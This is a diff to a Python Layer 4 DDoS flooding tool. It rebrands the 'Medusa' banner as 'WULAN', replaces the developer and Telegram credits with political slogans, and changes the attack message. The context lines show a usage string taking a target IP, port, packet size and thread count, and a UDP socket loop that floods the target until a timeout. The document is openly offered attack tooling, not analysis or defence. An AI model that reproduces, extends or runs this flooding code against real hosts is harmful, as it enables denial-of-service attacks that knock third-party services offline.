@@ -14,10 +14,10 @@ if len(sys.argv) < 5:
 \033[0m           ▀───▀ ▀▀▀ ▀▀▀─ ─▀▀▀ ▀▀▀ ▀──▀ \033[31m ▀▀▀─ ▀▀▀─ ▀▀▀▀ ▀▀▀     
 \033[33m       ╚═════════╦══════════════════════════════════╦═════════╝
 \033[33m       ╔═════════╩══════════════════════════════════╩═════════╗
-\033[33m       ║            Welcome To \033[31mMedusa Layer 4 DDoS            \033[33m║
-\033[33m       ║      \x1b[38;2;255;20;147m►► \033[0mThis tool for Layer 4 Attack \033[31m(\033[0mUDP \033[31m& \033[0mTCP\033[31m)     \033[33m║
-\033[33m       ║           Telegram \x1b[38;2;255;20;147m: \033[32mhttps://t.me/RipperSec          \033[33m║
-\033[33m       ║                 Developer \x1b[38;2;255;20;147m: \033[0mTrashDono                \033[33m║
+\033[33m       ║            Welcome To \033[31mWULAN Layer 4 DDoS            \033[33m║
+\033[33m       ║      \x1b[38;2;255;20;147m►► \033[0mFREE PALESTINE \033[31m(\033[0mUDP \033[31m& \033[0mTCP\033[31m)     \033[33m║
+\033[33m       ║           FROM RIVER \x1b[38;2;255;20;147m: \033[32mTO THE SEA          \033[33m║
+\033[33m       ║                 BIRRUH BIDHAM \x1b[38;2;255;20;147m: \033[0mNAFDIKA YAA AQSHA                \033[33m║
 \033[33m       ╚══════════════════════════════════════════════════════╝
 \033[0m""")
   sys.exit("\x1b[38;2;255;20;147m►► \033[0mUsage\x1b[38;2;255;20;147m: \033[0mpython3 \033[33mMedusaL4 \033[0m<\033[32mtimes\033[0m> <\033[32mip\033[0m> <\033[32mport\033[0m> <\033[32mpacket\033[0m> <\033[32mthreads\033[0m>")
@@ -34,7 +34,7 @@ timeout = time.time() + 1 * times
 def udp(ip, port, packet, times):
   timeout = time.time() + 1 * times
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
-  print(f"\x1b[31m[\x1b[33mMedusa\x1b[31m] \x1b[0mAttacking... \x1b[31m>  \x1b[0mtime \x1b[32m{times} \x1b[0mip \x1b[32m{ip}\x1b[31m:\x1b[32m{port}\x1b[0m packet \x1b[32m{packet}\x1b[0m threads \x1b[32m{threads}\x1b[0m ")
+  print(f"\x1b[31m[\x1b[33mMedusa\x1b[31m] \x1b[0mWulan is Attacking You... \x1b[31m>  \x1b[0mtime \x1b[32m{times} \x1b[0mip \x1b[32m{ip}\x1b[31m:\x1b[32m{port}\x1b[0m packet \x1b[32m{packet}\x1b[0m threads \x1b[32m{threads}\x1b[0m ")
   while time.time() < timeout:
     try:
       try:
